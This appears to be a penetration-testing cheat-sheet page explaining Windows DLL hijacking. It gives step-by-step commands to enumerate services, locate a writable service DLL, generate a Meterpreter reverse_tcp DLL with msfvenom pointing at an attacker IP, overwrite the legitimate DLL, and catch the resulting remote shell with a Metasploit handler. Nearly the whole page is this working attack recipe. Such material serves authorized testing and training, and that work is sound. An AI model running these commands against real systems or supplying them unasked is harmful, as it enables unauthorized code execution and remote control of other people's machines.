# DLL Hijacking

If we found running services using netstat or Get-Process, identify the executable that service is running and reversing the file. If the executable loads some DLL, we can overwrite the DLL to execute arbitrary code.

### Exploit <a href="#exploit" id="exploit"></a>

#### 1. Enumerate Services (Processes) <a href="#id-1-enumerate-services-processes" id="id-1-enumerate-services-processes"></a>

At first, list running processes and find interesting ones.

```
tasklist
Get-Process
ps
```

#### 2. Identify the Service <a href="#id-2-identify-the-service" id="id-2-identify-the-service"></a>

```
sc qc "example-service"
```

With the command above, we can see the path of the executable which runs the process.\
To see what DLLs are loaded on the executable, disassemble/decompile it with `strings` command, `WinDbg`, `x64dbg`, or online tools such as `Decompiler Explorer`.

#### 3. Check Write Permission of DLL <a href="#id-3-check-write-permission-of-dll" id="id-3-check-write-permission-of-dll"></a>

Find the DLL file on target machine, then check if we have write permission for the file.

```
icacls \path\to\example.dll
```

#### 4. Create Malicious DLL <a href="#id-4-create-malicious-dll" id="id-4-create-malicious-dll"></a>

If we have write permission, we can override the `.dll` file.\
So create a malicious DLL using `msfvenom` in local machine:

```
# Replace 10.0.0.1 with your local ip
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o evil.dll
```

After generating our `evil.dll`, replace the original DLL with this on target machine:

```
cp evil.dll \path\to\example.dll
```

Now start a TCP listener in local machine.

```
msfconsole
msf> use exploit/multi/handler
msf> set payload windows/x64/meterpreter/reverse_tcp
# Replace 10.0.0.1 with your ip
msf> set lhost 10.0.0.1
msf> set lport 4444
msf> run
```

When the service runs, our malicious DLL is loaded and the payload is executed.\
We may get a shell.
